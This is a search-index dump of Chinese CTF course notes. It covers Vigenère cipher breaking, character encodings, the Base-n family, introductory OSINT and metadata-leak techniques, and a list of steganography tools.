<p>\u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002</p> \u660e\u6587 c o m e g r e a t w a l l \u5bc6\u94a5 c r y p t o c r y p t o c <p>\u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587</p> <p></p> <p><code>\u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u5bc6\u6587\uff1aefkt zferrltzn</code></p>"},{"location":"Courses/ctf/Crypto/#_2","title":"\u7834\u89e3","text":"<p>\u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002</p> <p>\u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002\u00a0\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002</p> <p>\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a</p> <pre><code>\u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB`\n</code></pre> <p>\u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a</p> <pre><code>\u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB\n</code></pre> <p>\u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a</p> <pre><code>\u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD\n</code></pre> <p>\u5176\u4e2d\uff0c\u4e24\u4e2a <code>DYDUXRMH</code> \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u786e\u5b9a\u4e86\u5bc6\u94a5\u957f\u5ea6\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b57\u6bcd\u9891\u7387\u6216\u8005\u5355\u8bcd\u9891\u7387\u731c\u6d4b\u5bc6\u94a5\u7684\u5176\u4e2d\u51e0\u4f4d\uff0c\u968f\u540e\u6839\u636e\u5df2\u89e3\u5bc6\u7684\u90e8\u5206\u731c\u6d4b\u5355\u8bcd\uff0c\u7ee7\u7eed\u8fdb\u884c\u5bc6\u94a5\u7684\u7834\u89e3</p>"},{"location":"Courses/ctf/Misc/","title":"Misc \u57fa\u7840","text":"<p> \u7ea6 1736 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Misc \u5373\u6742\u9879</p> <ul> <li>\u9690\u5199\u3001\u53d6\u8bc1\u3001OSINT(\u4fe1\u606f\u6536\u96c6)\u3001PPC(\u7f16\u7a0b\u7c7b)</li> <li>\u6e38\u620f\u7c7b\u9898\u76ee\u3001\u5de5\u5177\u8fd0\u7528\u7c7b\u9898\u76ee</li> <li>\u7f16\u89e3\u7801\u3001\u53e4\u5178\u5bc6\u7801    \u2014\u2014\u4e0d\u90a3\u4e48Crypto\u7684Crypto</li> <li>\u7f51\u7edc\u89e3\u5bc6\u3001\u7f51\u7ad9\u4ee3\u7801\u5ba1\u8ba1    \u2014\u2014\u4e0d\u90a3\u4e48Web\u7684Web</li> <li>\u4ee3\u7801\u5ba1\u8ba1\u3001\u6c99\u7bb1\u9003\u9038    \u2014\u2014\u4e0d\u90a3\u4e48Binary\u7684Binary</li> <li>Blockchain\u3001IoT\u3001AI</li> </ul>"},{"location":"Courses/ctf/Misc/#_1","title":"\u57fa\u7840\u7f16\u89e3\u7801\u77e5\u8bc6","text":"<ul> <li>\u4e00\u5207\u4fe1\u606f\u5728\u8ba1\u7b97\u673a\u770b\u6765\u90fd\u662f0\u548c1<ul> <li>\u7f16\u89e3\u7801/\u52a0\u89e3\u5bc6/\u54c8\u5e0c\u90fd\u662f\u5728 01 \u4e32\u4e4b\u95f4\u53d8\u6362</li> </ul> </li> <li>\u4e3a\u4ec0\u4e48\u4f60\u770b\u89c1\u7684\u8f93\u5165\u662f\u5b57\u7b26\uff1f<ul> <li>\u8ba1\u7b97\u673a\u901a\u8fc7\u5b57\u7b26\u7f16\u7801\u89c4\u5219\u5c06 01 \u4e32\u8f6c\u5316\u4e3a\u4e86\u53ef\u89c1\u5b57\u7b26</li> </ul> </li> </ul> <p>\u4e09\u79cd\u5e38\u89c1\u7684 01 \u4e32\u8f6c\u6362\u65b9\u5f0f</p> <p></p>"},{"location":"Courses/ctf/Misc/#_2","title":"\u5e38\u89c1\u7684\u5b57\u7b26\u7f16\u7801","text":"<p>\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u4e71\u7801</p> <p>\u7528\u4e00\u79cd\u5b57\u7b26\u7f16\u7801\u89c4\u5219\u89e3\u8bfb\u53e6\u4e00\u79cd\u5b57\u7b26\u7f16\u7801\u7684\u00a001\u00a0\u4e32\uff0c\u5c31\u6709\u53ef\u80fd\u51fa\u73b0\u4e71\u7801</p> <ul> <li>ASCII\u7801\uff1a\u4e00\u5171128\u9879\uff0c\u6bcf\u4e2a\u5b57\u7b26\u53ef\u4ee5\u7528\u4e00\u4e2a\u00a07\u00a0\u4f4d\u7684\u00a001\u00a0\u4e32\u8868\u793a\uff08\u6216\u4e00\u5b57\u8282\uff09<ul> <li>ASCII\u7801\u7684\u7b2c\u516b\u4f4d\u4e00\u822c\u7528\u4e8e\u5947\u5076\u6821\u9a8c\u4f4d\uff0c\u4f46\u8bb8\u591a\u57fa\u4e8ex86\u7684\u7cfb\u7edf\u90fd\u652f\u6301\u4f7f\u7528\u62d3\u5c55ASCII\u7801\uff0c\u5c06\u6bcf\u4e2a\u5b57\u7b26\u7684\u7b2c\u516b\u4f4d\u7528\u4e8e\u786e\u5b9a\u9644\u52a0\u7684128\u4e2a\u7279\u6b8a\u7b26\u53f7\u5b57\u7b26\u3001\u5916\u6765\u8bed\u5b57\u6bcd\u548c\u56fe\u5f62\u7b26\u53f7</li> <li>00-1F\uff1a\u63a7\u5236\u5b57\u7b26\uff1b20-7E\uff1a\u53ef\u89c1\u5b57\u7b26\uff1b7F\uff1a\u63a7\u5236\u5b57\u7b26\uff08DEL\uff09</li> </ul> </li> <li>Latin-1\uff08ISO-8859-1\uff09\uff1a\u6269\u5c55\u4e86\u00a0ASCII\uff0c\u4e00\u5171\u00a0256\u00a0\u4e2a\u9879<ul> <li>80-9F\uff1a\u63a7\u5236\u5b57\u7b26\uff1bA0-FF\uff1a\u53ef\u89c1\u5b57\u7b26</li> <li>\u7279\u70b9\uff1a\u4efb\u4f55\u5b57\u8282\u6d41\u90fd\u53ef\u4ee5\u7528\u5176\u89e3\u7801</li> </ul> </li> <li>\u4e2d\u56fd\u56fd\u6807\u5b57\u7b26\u96c6\u7cfb\u5217\u7f16\u7801<ul> <li>GB 2312 / GBK / GB 18030-2022</li> </ul> </li> <li>\u5229\u7528\u00a0Unicode\u00a0\u5b57\u7b26\u96c6\u7684\u4e00\u7cfb\u5217\u7f16\u7801<ul> <li>UTF-8 / UTF-16 / UTF-32 / UCS</li> <li>UTF-8\u662f\u76ee\u524d\u6700\u5e38\u7528\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5b83\u662f\u53ef\u53d8\u5bbd\u5ea6\u5b57\u7b26\u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u88ab\u7f16\u7801\u62101\u52304\u5b57\u8282\uff0c\u6bcf\u4e2a\u5b57\u8282\u90fd\u662f\u7531\u5f00\u5934\u7684\u51e0\u4e2a\u6bd4\u7279\u524d\u7f00(\u4e00\u822c\u9700\u8981\u51e0\u4e2a\u5b57\u8282\u5c31\u6709\u51e0\u4e2a1)\u548c\u5269\u4f59\u7684\u6570\u636e\u90e8\u5206\u7ec4\u6210 \u517c\u5bb9ASCII<ul> <li></li> </ul> </li> <li>UTF-16\u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\uff0c\u5b83\u5c06\u4e00\u4e2a\u5b57\u7b26\u7f16\u7801\u62101~2\u4e2a16\u6bd4\u7279\u957f\u7684\u7801\u5143(\u4ea6\u53732/4\u5b57\u8282) \u4e0d\u517c\u5bb9ASCII</li> </ul> </li> </ul> <p>\u7f16\u7801\u7684\u517c\u5bb9\u6027</p> <p></p> GB\u7cfb\u5217\u8865\u5145 <ul> <li>GB 2312\u4f7f\u7528\u5206\u533a\u7ba1\u7406\uff0c\u5171\u8ba194\u4e2a\u533a\uff0c\u6bcf\u4e2a\u533a\u542b94\u4e2a\u7801\u4f4d\uff0c\u51718836\u4e2a\u7801\u4f4d<ul> <li>01-09\u533a\u6536\u5f55\u9664\u6c49\u5b57\u5916\u7684682\u4e2a\u5b57\u7b26</li> <li>10-15\u533a\u4e3a\u7a7a\u767d\u533a</li> <li>16-55\u533a\u6536\u5f553755\u4e2a\u4e00\u7ea7\u6c49\u5b57\uff0c\u6309\u62fc\u97f3\u6392\u5e8f</li> <li>56-87\u533a\u6536\u5f553008\u4e2a\u4e8c\u7ea7\u6c49\u5b57\uff0c\u6309\u90e8\u9996/\u7b14\u753b\u6392\u5e8f</li> <li>88-94\u4e3a\u7a7a\u767d\u533a</li> <li></li> <li>\u7f16\u7801\u4e3e\u4f8b\uff1a\u6c49\u5b57 <code>\u4f83</code> \u572857\u533a09\u4f4d\uff0c\u5206\u522b\u8f6c\u621016\u8fdb\u5236\u4e3a 0x39,0x09\uff0c\u518d\u52a0\u4e0a0xA0\u5373\u53ef\u5f97\u5230GB2312\u7f16\u7801 <code>0xD90xA9</code> <ul> <li>\u56e0\u4e3aGB 2312\u7f16\u7801\u5f00\u5934\u90fd\u5927\u4e8e0xA0\uff0c\u6240\u4ee5\u4e0eASCII\u7801\u517c\u5bb9</li> </ul> </li> </ul> </li> <li>GBK\u4e0d\u518d\u89c4\u5b9a\u4f4e\u4f4d\u8981\u5927\u4e8e127\uff0c\u65b0\u589e\u4e8620000\u4e2a\u6c49\u5b57\u548c\u7b26\u53f7</li> <li>GB 18030\u91c7\u53d6\u6df7\u5408\u7f16\u7801\uff0c\u65b0\u589e\u4e86\u51e0\u5343\u591a\u4e2a\u5c11\u6570\u6c11\u65cf\u5b57\u7b26</li> </ul> <p>\u5e38\u89c1\u7684\u5b57\u7b26\u96c6\u4e0d\u517c\u5bb9\u7684\u90e8\u5206\u4e92\u76f8\u7f16\u89e3\u7801\uff1a</p> <ul> <li>\u7528\u00a0GBK\u00a0\u89e3\u7801\u00a0UTF-8\u00a0\u7f16\u7801\u7684\u6587\u672c</li> <li>\u7528\u00a0UTF-8\u00a0\u89e3\u7801\u00a0GBK\u00a0\u7f16\u7801\u7684\u6587\u672c</li> <li>\u7528\u00a0latin-1\u00a0\u89e3\u7801\u00a0UTF-8\u00a0\u7f16\u7801\u7684\u6587\u672c</li> <li>\u7528\u00a0latin-1\u00a0\u89e3\u7801\u00a0GBK\u00a0\u7f16\u7801\u7684\u6587\u672c</li> <li>\u5148\u7528\u00a0GBK\u00a0\u89e3\u7801\u00a0UTF-8\u00a0\u7f16\u7801\u7684\u6587\u672c\uff0c\u518d\u7528\u00a0UTF-8\u00a0\u89e3\u7801\u524d\u9762\u7684\u7ed3\u679c</li> <li>\u5148\u7528\u00a0UTF-8\u00a0\u89e3\u7801\u00a0GBK\u00a0\u7f16\u7801\u7684\u6587\u672c\uff0c\u518d\u7528\u00a0GBK\u00a0\u89e3\u7801\u524d\u9762\u7684\u7ed3\u679c</li> </ul> <p>\ufffd \u662fUTF-8\u7684'\u975e\u9884\u671f'\u7684\u610f\u601d</p> <p>\u4e0a\u8ff0\u90fd\u662f 01 \u4e32 \\(\\Leftrightarrow\\)  \u5b57\u7b26\uff0c\u63a5\u4e0b\u6765\u770b\u4e00\u79cd \u5b57\u7b26 \\(\\Leftrightarrow\\)  \u5b57\u7b26</p> <ul> <li>\u6469\u5c14\u65af\u7535\u7801(Morse Code)\uff1a\u5229\u7528\u70b9\u5212\u6765\u8868\u793a\u5b57\u7b26<ul> <li>\u70b9 \u00b7 \uff1a1\u5355\u4f4d\uff1b \u5212 - \uff1a3\u5355\u4f4d</li> <li>\u70b9\u5212\u4e4b\u95f4\u95f4\u9694\uff1a1\u00a0\u5355\u4f4d\uff1b\u5b57\u7b26\u4e4b\u95f4\u95f4\u9694\uff1a3\u00a0\u5355\u4f4d\uff1b\u5355\u8bcd\u4e4b\u95f4\u95f4\u9694\uff1a7\u00a0\u5355\u4f4d</li> </ul> </li> <li>\u5b57\u7b26\u96c6\uff1aA-Z\u30010-9\u3001\u6807\u70b9\u7b26\u53f7\uff08.:,;?='/!-_\"()$&amp;@+\uff09</li> <li>\u8868\u793a\u4e2d\u6587\uff1a\u7535\u7801\u8868\uff08\u4e00\u4e2a\u6c49\u5b57\u5bf9\u5e94\u56db\u4e2a\u6570\u5b57\uff09\uff0c\u6570\u5b57\u4f7f\u7528\u77ed\u7801\u53d1\u9001</li> <li></li> </ul> <p>\u63a5\u4e0b\u6765\u662f 01 \u4e32 \\(\\Leftrightarrow\\) 01 \u4e32\uff0c\u5373Base\u7f16\u7801\u5bb6\u65cf</p> <ul> <li>Base16\uff1a\u537316\u8fdb\u5236\u8868\u793a\u5b57\u8282\u6d41\uff0c\u957f\u5ea6\u7ffb\u500d</li> <li>Base32\uff1a\u6309\u7167 5 bit\u4e00\u7ec4(\u6bcf\u4e2a 0-31)\uff0c\u6309\u7167\u5b57\u7b26\u8868\uff08A-Z2-7\uff09\u6620\u5c04<ul> <li>\u7ed3\u679c\u957f\u5ea6\u5fc5\u987b\u662f\u00a05\u00a0\u7684\u500d\u6570\uff0c\u4e0d\u8db3\u7684\u7528\u00a0=\u00a0\u4e0d\u9f50\uff08\u660e\u663e\u7279\u5f81\uff09</li> </ul> </li> <li>Base64\uff1a\u6309\u7167\u00a06 bit\u00a0\u4e00\u7ec4\uff0c\u6309\u7167\u5b57\u7b26\u8868\u6620\u5c04\uff08\u6700\u5e38\u7528\uff09<ul> <li>\u6807\u51c6\u5b57\u7b26\u8868\uff1aA-Za-z0-9+/</li> <li>\u53e6\u6709\u591a\u79cd\u5e38\u7528\u5b57\u7b26\u8868\uff0c\u5982\u00a0URL\u00a0\u5b89\u5168\u5b57\u7b26\u8868\uff1aA-Za-z0-9-_</li> <li>\u7ed3\u679c\u957f\u5ea6\u5fc5\u987b\u662f\u00a04\u00a0\u7684\u500d\u6570\uff0c\u4e0d\u8db3\u7684\u7528\u00a0=\u00a0\u4e0d\u9f50\uff081~2\u00a0\u4e2a\uff0c\u660e\u663e\u7279\u5f81\uff09</li> </ul> </li> </ul> <p>\u5206\u522b\u7528Base32\u548cBase64\u7f16\u7801AAA</p> <p></p> <p>Base-n \u7cfb\u5217\u672c\u8d28\uff1a\u5b57\u8282\u6d41\u00a0-&gt;\u00a0\u6574\u6570\u00a0-&gt; n\u00a0\u8fdb\u5236\u00a0-&gt;\u00a0\u7cfb\u6570\u67e5\u8868</p> <p>\u6240\u4ee5\u9664\u53bb\u524d\u9762\u7684\u6574\u89c4\u5219\uff0c\u8fd8\u6709\u4e00\u4e9b\u5176\u5b83\u7684Base\u7f16\u7801</p> <ul> <li>\u5206\u7ec4\uff1a<ul> <li>Base85\uff1a4\u00a0\u5b57\u8282\u6574\u6570\u00a0-&gt; 85\u00a0\u8fdb\u5236\u00a0-&gt; 5\u00a0\u4e2a\u7cfb\u6570<ul> <li>\u5e38\u7528\u5b57\u7b26\u8868\uff1a0-9A-Za-z!#$%&amp;()*+-;&lt;=&gt;?@^_`{|}~</li> <li>\u6807\u51c6\u5b57\u7b26\u8868\uff1a!-u\uff08ASCII\u00a0\u7f16\u7801\u4e2d\u00a00x21-0x75\uff09</li> </ul> </li> </ul> </li> <li>\u4f5c\u4e3a\u5927\u6574\u6570\u8f6c\u6362\u8fdb\u5236\uff1a<ul> <li>Base62\uff1a0-9A-Za-z\uff08\u6bd4\u00a0Base64\u00a0\u5c11\u4e86\u00a0+/\uff09</li> <li>Base58\uff1a0-9A-Za-z\u00a0\u53bb\u9664\u00a00OIl</li> <li>Base56\uff1a\u6bd4\u00a0Base58\u00a0\u5c11\u4e86\u00a01\u00a0\u548c\u00a0o</li> <li>Base36\uff1a0-9A-Z\uff08\u6bd4\u00a0Base62\u00a0\u5c11\u4e86\u00a0a-z\uff09</li> </ul> </li> </ul>"},{"location":"Courses/ctf/Misc/#osint","title":"OSINT \u57fa\u7840","text":"<p>Open\u00a0Source\u00a0INTelligence\uff1a\u5f00\u6e90\u7f51\u7edc\u60c5\u62a5</p> <ul> <li>\u901a\u8fc7\u5b8c\u5168\u516c\u5f00\u7684\u4fe1\u606f\u8fdb\u884c\u5408\u7406\u7684\u63a8\u7406\uff0c\u83b7\u53d6\u60c5\u62a5</li> <li>\u4e00\u822c\u5728\u00a0misc\u00a0\u9898\u76ee\u4e2d\u51fa\u73b0\u5373\u6cdb\u6307\u4fe1\u606f\u641c\u96c6\uff0c\u6709\u51e0\u79cd\u60c5\u51b5\uff1a<ul> <li>\u6784\u9020\u4e86\u4e00\u4e2a\u5168\u65b0\u7684\u865a\u62df\u8eab\u4efd\uff0c\u641c\u96c6\u5f97\u5230\u51fa\u9898\u4eba\u51c6\u5907\u597d\u7684\u4fe1\u606f</li> <li>\u6839\u636e\u56fe\u7247\u3001\u6587\u6863\u7b49\u9644\u4ef6\u6cc4\u6f0f\u7684\u4fe1\u606f\u8fdb\u884c\u63a8\u7406 \uff08\u4e3b\u8981\uff09<ul> <li>\u5305\u62ec\u6839\u636e\u56fe\u7247\u5185\u5bb9\u63a8\u7406\u627e\u5230\u62cd\u6444\u4f4d\u7f6e\u3001\u5f53\u65f6\u73af\u5883\u7b49\u4fe1\u606f</li> </ul> </li> </ul> </li> </ul>"},{"location":"Courses/ctf/Misc/#_3","title":"\u4fe1\u606f\u641c\u67e5/\u67e5\u8be2\u57fa\u7840","text":"<ul> <li>\u4e00\u7cfb\u5217\u6570\u5b57\u4fe1\u606f\u641c\u96c6\u5de5\u5177\uff1a<ul> <li>https://github.com/ffffffff0x/Digital-Privacy</li> </ul> </li> <li>\u7528\u6237\u540d\u6279\u91cf\u67e5\u8be2\uff1a<ul> <li>sherlock:\u00a0https://github.com/sherlock-project/sherlock</li> <li>namechk:\u00a0https://namechk.com/</li> </ul> </li> <li>\u9ad8\u7ea7\u641c\u7d22\u65b9\u5f0f<ul> <li>filetype:...</li> <li>site:...</li> <li>inurl:... intitle:... intext:...</li> </ul> </li> <li>Wayback Machine\u00a0web.archive.org<ul> <li>\u67e5\u627e\u7f51\u9875\u7684\u5386\u53f2\u5feb\u7167\uff08\u4ee5\u53ca\u53ef\u4ee5\u521b\u5efa\u5feb\u7167\uff09</li> <li>\u6709\u65f6\u53ef\u4ee5\u627e\u5230\u51fa\u9898\u4eba\u7279\u610f\u4fdd\u5b58\u5feb\u7167\u540e\u5220\u9664\u7684\u5185\u5bb9</li> </ul> </li> </ul>"},{"location":"Courses/ctf/Misc/#_4","title":"\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732","text":"<ul> <li>\u5404\u79cd\u6587\u6863\u7684\u5143\u4fe1\u606f\uff08metadata\uff09\u53ef\u80fd\u5305\u62ec\u4f5c\u8005\u3001\u4fee\u6539\u65f6\u95f4\u7b49\u4fe1\u606f<ul> <li>\u56fe\u7247\u7684\u00a0EXIF\u00a0\u4fe1\u606f\uff0c\u53ef\u901a\u8fc7\u00a0exiftool\u00a0\u67e5\u770b</li> <li>\u4e00\u822c\u4ee5\u00a0xml\u00a0\u5f62\u5f0f\u5b58\u50a8\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4e8c\u8fdb\u5236\u62b9\u9664\uff0c\u6216\u8005\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf</li> </ul> </li> <li>\u5de5\u7a0b\u6587\u4ef6\u5939\u6cc4\u6f0f\u4fe1\u606f<ul> <li>Visual Studio\u00a0\u7684\u5404\u79cd\u914d\u7f6e\u6587\u4ef6\uff0c.vs\u00a0\u6587\u4ef6\u5939\u4e2d\u4fe1\u606f</li> <li>.vscode\u00a0\u6587\u4ef6\u5939\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6</li> <li>.git\u00a0\u6587\u4ef6\u5939\uff0c\u6cc4\u6f0f\u5168\u90e8\u4fee\u6539\u5386\u53f2\u3001\u63d0\u4ea4\u4fe1\u606f\u3001\u63d0\u4ea4\u8005\u7b49</li> </ul> </li> <li>\u6587\u4ef6\u5939\u8def\u5f84\u4fe1\u606f\u6cc4\u6f0f<ul> <li>.DS_Store\u00a0\u6587\u4ef6\uff0cmacOS\u00a0\u4e0b\u7684\u6587\u4ef6\u5939\u5e03\u5c40\u4fe1\u606f</li> <li>\u524d\u9762\u5404\u79cd\u5de5\u7a0b\u914d\u7f6e\u6587\u4ef6\u7b49\u4e5f\u4f1a\u6cc4\u6f0f\uff08\u6bd4\u5982\u00a0vs\u00a0\u7684\u00a0pdb\u00a0\u8c03\u8bd5\u4fe1\u606f\uff09</li> <li>markdown\u00a0\u6587\u4ef6\u56fe\u7247\u8def\u5f84\uff08\u672c\u5730\u8def\u5f84\u00a0/\u00a0\u56fe\u5e8a\u7528\u6237\u00a0/\u00a0\u81ea\u5efa\u56fe\u5e8a\u7f51\u7ad9\uff09</li> </ul> </li> </ul>"},{"location":"Courses/ctf/Misc/#-","title":"\u7167\u7247\u4fe1\u606f\u5206\u6790 - \u56fe\u7247\u641c\u7d22","text":"<p>\u4e00\u4e9b\u5e38\u7528\u7684\u641c\u7d22\u5f15\u64ce\uff1a</p> <ul> <li>\u767e\u5ea6\u8bc6\u56fe\u641c\u7d22\uff1a\u4e2d\u6587\u4e92\u8054\u7f51\u56fe\u7247\u641c\u7d22\u7ed3\u679c</li> <li>Google\u00a0\u56fe\u7247\u641c\u7d22\uff1a\u7528\u6765\u641c\u7d22\u5916\u56fd\u8303\u56f4\u7684\u56fe\u7247</li> <li>Bing\u00a0\u56fe\u7247\u641c\u7d22\uff1a\u548c\u00a0Google\u00a0\u5dee\u4e0d\u591a\uff0c\u90fd\u53ef\u4ee5\u53c2\u8003</li> <li>Yandex\u00a0\u56fe\u7247\u641c\u7d22\uff1a<ul> <li>\u641c\u7d22\u76f8\u4f3c\u56fe\u7247</li> <li>\u641c\u7d22\u98ce\u666f\u65f6\u66f4\u5e38\u7528</li> </ul> </li> <li>TinEye\uff1a\u641c\u7d22\u5b8c\u5168\u76f8\u540c\u7684\u56fe\u7247\uff08\u627e\u6765\u6e90\uff09</li> </ul> <p>\u5176\u4ed6\u73af\u5883\u4fe1\u606f\u7684\u5206\u6790\uff1a</p> <ul> <li>\u592a\u9633\u89d2\u5ea6\u3001\u9634\u5f71\u957f\u5ea6\u7b49\u592a\u9633\u76f8\u5173<ul> <li>\u65f6\u95f4\u00a0&lt;=&gt;\u00a0\u4f4d\u7f6e\u4e92\u76f8\u4f30\u8ba1</li> <li>suncalc.org</li> <li>sunearthtools.com</li> </ul> </li> <li>\u5929\u6c14\u4fe1\u606f\u3001\u4e91\u5c42\u4fe1\u606f\u7b49</li> <li>\u98de\u673a\u822a\u73ed\u4fe1\u606f<ul> <li>\u4f30\u8ba1\u65b9\u5411\uff0c\u4f4d\u7f6e\uff0c\u65f6\u95f4\u7b49</li> <li>flightaware.com</li> <li>flightera,bet</li> <li>flightradar24.com</li> <li>adsbexchange.com</li> </ul> </li> <li>\u98ce\u666f\u4fe1\u606f<ul> <li>Yandex\u00a0\u641c\u7d22</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/","title":"Misc \u4e13\u9898","text":""},{"location":"Courses/ctf/MiscTopic/#misc","title":"Misc \u4e13\u9898","text":"<p> \u7ea6 4176 \u4e2a\u5b57  28 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 21 \u5206\u949f</p>"},{"location":"Courses/ctf/MiscTopic/#misc_1","title":"Misc \u4e13\u9898\u4e00 \u66f4\u591a\u9690\u5199","text":"<p>\u5de5\u5177</p> <ul> <li>Steghide</li> <li>Zsteg</li> <li>StegSolve</li> </ul>"},{"location":"Courses/ctf/MiscTopic/#_1","title":"\u56fe\u50cf\u683c\u5f0f","text":"<ul> <li>\u56fe\u50cf\u4fe1\u606f\uff1a\u5bbd\u9ad8\u3001\u8272\u5f69\u6a21\u5f0f\u3001\u8272\u5f69\u7a7a\u95f4\u7b49<ul> <li>EXIF\u00a0\u4fe1\u606f\uff1a\u62cd\u6444\u8bbe\u5907\u3001\u62cd\u6444\u65f6\u95f4\u3001GPS\u00a0\u4fe1\u606f\u7b49</li> </ul> </li> <li>\u50cf\u7d20\u6570\u636e\uff1a\u6bcf\u4e2a\u50cf\u7d20\u7684\u989c\u8272\u4fe1\u606f\uff1b\u4e8c\u503c\u3001\u7070\u5ea6\u3001RGB\u3001CMYK\u3001\u8c03\u8272\u76d8\u7b49<ul> <li>\u5bf9\u4e8e\u6807\u51c6\u00a0RGB\u00a0\u56fe\u50cf\uff0c\u6bcf\u4e2a\u50cf\u7d20\u9700\u8981\u00a024 bits</li> <li>\u5bf9\u4e8e\u4e00\u5f20\u00a01080p\u00a0\u56fe\u50cf\uff0c\u9700\u8981\u00a06.22 MB\uff0c4K\u00a0\u5219\u9700\u8981\u00a024.88 MB</li> <li>BMP\u00a0\u683c\u5f0f</li> </ul> </li> <li>\u56fe\u50cf\u683c\u5f0f\u7684\u538b\u7f29\u7b97\u6cd5<ul> <li>PNG\u00a0\u65e0\u635f\uff0cJPEG\u00a0\u6709\u635f</li> 